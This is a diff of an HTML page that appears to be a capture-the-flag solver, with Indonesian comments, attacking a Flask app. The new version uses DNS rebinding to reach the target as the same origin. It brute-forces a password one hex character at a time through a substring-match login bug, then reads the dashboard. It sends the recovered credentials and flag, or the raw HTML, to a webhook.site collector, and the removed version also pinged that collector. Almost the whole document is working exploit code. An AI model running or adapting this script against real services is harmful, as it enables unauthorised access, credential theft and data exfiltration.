@@ -1,50 +1,85 @@
 <!doctype html>
-<meta charset="utf-8" />
-<title>solver</title>
+<meta charset="utf-8">
+<title>existential-1shot</title>
 <script>
-const HOST = "http://research.r3plican.dev:1336";          // target Flask
-const COLLECTOR = "https://webhook.site/094d81b4-c0aa-4fc1-ba3f-369e0a6b53e8";              // log receiver
-const USERNAME = "longlonglonguser";                             // asumsi default
+(async () => {
+  // ==== KONFIG ====
+  const WEBHOOK_URL = "https://webhook.site/094d81b4-c0aa-4fc1-ba3f-369e0a6b53e8"; // ganti punyamu
+  const HOST = location.hostname;   // host rbndr yang akan di-rebind
+  const BASE = `http://${HOST}:1336`; // target Flask origin (same-origin dgn halaman ini)
 
-const HEX = "0123456789abcdef";
-const PREFIX = "replicanx";
-const TRIES_PER_CAND = 6;    // 5-8 cukup, makin besar makin stabil
+  const send = (obj) => fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify(obj)
+  }).catch(()=>{});
 
-async function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
+  // helper GET (no cache, include cookies)
+  async function get(path) {
+    const r = await fetch(`${BASE}${path}?cb=${Math.random()}`, {
+      credentials: "include",
+      cache: "no-store",
+    });
+    return r;
+  }
 
-async function tryCandidate(prefix){
-  // buka popup ke Flask (cross-origin), kita masih bisa set location berkali-kali
-  const w = window.open(`${HOST}/api/login?username=${USERNAME}&password=${encodeURIComponent(prefix)}`, "_blank");
-  const t0 = performance.now();
+  // ==== 1) Coba username default ====
+  let username = "longlonglonguser"; // default di Flask kalau env USERNAME tidak diset
+  await send({stage:"info", msg:"trying default username", username});
 
-  // beri waktu network settle sedikit
-  await sleep(300);
-  try { w.location = `${HOST}/dashboard/`; } catch(e) {}
-  await sleep(150);
+  // ==== 2) Brute password dengan bug substring ====
+  // real format: "replicanx" + 6 hex; server pakai 'password in real_password'
+  const prefix = "replicanx";
+  const hex = "0123456789abcdef";
+  let suffix = "";
 
-  // trigger verifier -> redirect ke collector kita (jadi “ping”)
-  const ping = `${COLLECTOR}/ping?g=${encodeURIComponent(prefix)}&t=${Date.now()}`;
-  try { w.location = `${HOST}/verifier?q=${encodeURIComponent(ping)}`; } catch(e) {}
+  async function tryPass(pw) {
+    // endpoint menerima GET juga; 200 + "Login successful" jika match substring
+    const r = await get(`/api/login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(pw)}`);
+    const t = await r.text();
+    return t.includes("Login successful");
+  }
 
-  // kita tidak bisa menunggu network dari sini; biarkan bot menutup sendiri.
-  // script ini hanya men-*schedule* urutan aksi di tab popup.
-}
-
-async function run(){
-  // brute force 6 nibble, prefix-by-prefix
-  let known = PREFIX;
-  for (let i = 0; i < 6; i++){
-    // uji semua kandidat nibble di posisi ini
-    for (const c of HEX){
-      for (let k = 0; k < TRIES_PER_CAND; k++){
-        await tryCandidate(known + c);
-        await sleep(400); // jeda pendek
+  // jika default username salah (env diset), kita bisa fallback ke leak username via STTF nanti.
+  // Untuk 1-shot: brute dulu. Kalau gagal total, kirim sinyal dan berhenti (biar kamu putuskan mau leak uname).
+  let ok = true;
+  for (let i = 0; i < 6; i++) {
+    let found = null;
+    for (const c of hex) {
+      const cand = prefix + suffix + c;
+      const good = await tryPass(cand);
+      if (good) {
+        suffix += c;
+        found = c;
+        await send({stage:"brute", pos:i, hit:c, prefix:suffix});
+        break;
       }
     }
-    // kamu pilih nibble terbaik (median waktu terendah) dari log collector
-    // lalu update "known += bestNibble" dan reload solver.html dengan query ?known=<...>
+    if (!found) { ok = false; break; }
   }
-}
 
-run();
+  if (!ok) {
+    await send({stage:"fail", msg:"default username mungkin salah; lanjutkan dengan leak username atau update rebind."});
+    return;
+  }
+
+  const password = prefix + suffix;
+  await send({stage:"creds", username, password});
+
+  // ==== 3) Ambil FLAG dari dashboard Flask ====
+  // Cookie 'auth' sudah diset oleh login di atas → akses /dashboard/
+  const r = await get(`/dashboard/`);
+  const html = await r.text();
+
+  // coba regex flag umum (atau fallback: kirim seluruh HTML dashboard)
+  const m = html.match(/[A-Z0-9]{2,6}\{[^}]{5,120}\}/i);
+  const flag = m ? m[0] : null;
+
+  await send({
+    stage:"exfil",
+    flag: flag || "FLAG_NOT_FOUND",
+    snippet: flag ? undefined : html.slice(0, 1000)
+  });
+
+})();
 </script>
